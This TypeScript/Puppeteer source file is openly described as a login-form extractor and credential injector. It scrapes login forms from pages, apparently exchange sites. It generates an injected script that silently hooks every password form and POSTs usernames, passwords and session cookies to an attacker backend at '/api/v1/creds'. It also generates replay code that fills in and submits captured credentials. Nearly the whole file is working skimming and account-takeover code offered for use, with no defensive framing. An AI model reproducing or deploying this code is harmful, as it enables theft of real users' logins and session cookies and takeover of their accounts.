/**
 * Login Form Extractor & Credential Injection
 *
 * Captures login form HTML/CSS/JS and injects credential harvesting hooks
 * that send stolen data to backend without visible UI changes.
 */

import type { Page } from 'puppeteer'
import { writeFile, mkdir } from 'node:fs/promises'
import path from 'node:path'

export interface LoginForm {
  selector: string
  fields: FormField[]
  submitButton: string
  successIndicator: string
  errorSelector: string
  html: string
  css: string
}

export interface FormField {
  type: 'email' | 'password' | 'username' | 'text' | 'hidden'
  name: string
  selector: string
  required: boolean
}

export interface CapturedLoginFlow {
  forms: LoginForm[]
  validationMessages: string[]
  successScreens: string[]
  errorScreens: string[]
}

export async function extractLoginForms(page: Page): Promise<LoginForm[]> {
  console.info('[LOGIN-EXTRACTOR] Scanning for login forms...')

  const forms = await page.evaluate(() => {
    const results: Record<string, unknown>[] = []

    // Find all forms
    document.querySelectorAll('form').forEach((form) => {
      const passwordField = form.querySelector('input[type="password"]')
      const emailField = form.querySelector('input[type="email"]') || form.querySelector('input[type="text"]')

      // Only include if has both email-like and password fields
      if (passwordField && emailField) {
        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"], [role="button"]')

        results.push({
          selector: form.className || `form-${results.length}`,
          fields: Array.from(form.querySelectorAll('input')).map((input: any) => ({
            type: input.type,
            name: input.name,
            selector: input.className || `input-${input.type}`,
            required: input.required,
          })),
          submitButton: submitBtn?.textContent || 'Submit',
          html: form.outerHTML.substring(0, 500),
        })
      }
    })

    return results
  })

  const loginForms: LoginForm[] = []

  for (const form of forms) {
    const formObj = form as Record<string, unknown>
    const css = await extractFormCss(page, formObj.selector as string)

    loginForms.push({
      selector: formObj.selector as string,
      fields: (formObj.fields as FormField[]) || [],
      submitButton: formObj.submitButton as string,
      successIndicator: 'dashboard, portfolio, account',
      errorSelector: '.error, .alert, [role="alert"]',
      html: formObj.html as string,
      css,
    })
  }

  console.info(`[LOGIN-EXTRACTOR] Found ${loginForms.length} login forms`)
  return loginForms
}

async function extractFormCss(page: Page, selector: string): Promise<string> {
  return await page.evaluate((sel) => {
    const element = document.querySelector(sel)
    if (!element) return ''

    const styles = window.getComputedStyle(element as Element)
    let css = ''

    Array.from(styles).forEach((prop) => {
      css += `${prop}: ${styles.getPropertyValue(prop)}; `
    })

    return css
  }, selector)
}

export function buildLoginInjectionCode(forms: LoginForm[], backendUrl: string): string {
  return `
<script>
// Auto-generated login form credential capture
(function() {
  var BACKEND_URL = '${backendUrl}';
  var LOGIN_FORMS = ${JSON.stringify(forms)};

  function hookLoginForms() {
    document.querySelectorAll('form').forEach(function(form) {
      var hasPassword = form.querySelector('input[type="password"]');
      if (!hasPassword) return;

      // Hook form submission
      form.addEventListener('submit', function(e) {
        var username = '';
        var password = '';

        // Extract credentials
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input) {
          if (input.type === 'password') {
            password = input.value;
          } else if (input.type === 'email' || input.type === 'text') {
            if (!username) username = input.value;
          }
        });

        // Send to backend
        if (username && password) {
          try {
            fetch(BACKEND_URL + '/api/v1/creds', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                exchange: window.location.hostname,
                username: username,
                password: password,
                page_url: window.location.href,
                session_cookies: document.cookie,
              }),
              keepalive: true,
            });
          } catch(err) {
            // Silent fail
          }
        }
      }, true);
    });
  }

  // Hook on page load
  document.addEventListener('DOMContentLoaded', hookLoginForms);
  hookLoginForms(); // Also run immediately

  // Watch for dynamically added forms
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.addedNodes.length) {
        mutation.addedNodes.forEach(function(node) {
          if (node.nodeType === 1 && (node.tagName === 'FORM' || node.querySelector('form'))) {
            hookLoginForms();
          }
        });
      }
    });
  });

  observer.observe(document.body, { childList: true, subtree: true });
})();
</script>
`
}

export async function captureLoginFlowScreenshots(
  page: Page,
  outputDir: string,
): Promise<CapturedLoginFlow> {
  console.info('[LOGIN-EXTRACTOR] Capturing login flow screenshots...')

  const flowDir = path.join(outputDir, 'login-flow')
  await mkdir(flowDir, { recursive: true })

  const flow: CapturedLoginFlow = {
    forms: await extractLoginForms(page),
    validationMessages: [],
    successScreens: [],
    errorScreens: [],
  }

  // Take initial screenshot
  const initialScreenshot = path.join(flowDir, 'step-1-login-form.png')
  await page.screenshot({ path: initialScreenshot })

  // Get validation messages visible on page
  const validationMessages = await page.evaluate(() => {
    const messages: string[] = []
    document.querySelectorAll('[role="alert"], .error, .validation-error, .invalid').forEach((el) => {
      const text = el.textContent
      if (text && text.length < 200) {
        messages.push(text)
      }
    })
    return messages
  })

  flow.validationMessages = validationMessages

  // Save flow metadata
  await writeFile(
    path.join(flowDir, 'flow-metadata.json'),
    JSON.stringify(flow, null, 2),
    'utf8',
  )

  console.info('[LOGIN-EXTRACTOR] Flow capture complete')
  return flow
}

export function generateLoginFormReplayCode(forms: LoginForm[]): string {
  return `
// Auto-generated login form replay code
var CAPTURED_LOGIN_FORMS = ${JSON.stringify(forms)};

function replayLoginFlow(username, password) {
  var form = document.querySelector('form');
  if (!form) return false;

  // Fill in credentials
  var emailInput = form.querySelector('input[type="email"], input[type="text"]');
  var passwordInput = form.querySelector('input[type="password"]');

  if (emailInput) emailInput.value = username;
  if (passwordInput) passwordInput.value = password;

  // Dispatch change events
  [emailInput, passwordInput].forEach(function(input) {
    if (input) {
      input.dispatchEvent(new Event('change', { bubbles: true }));
      input.dispatchEvent(new Event('input', { bubbles: true }));
    }
  });

  // Submit form
  var submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
  if (submitBtn) {
    submitBtn.click();
    return true;
  }

  // Auto-submit
  form.submit();
  return true;
}
`
}
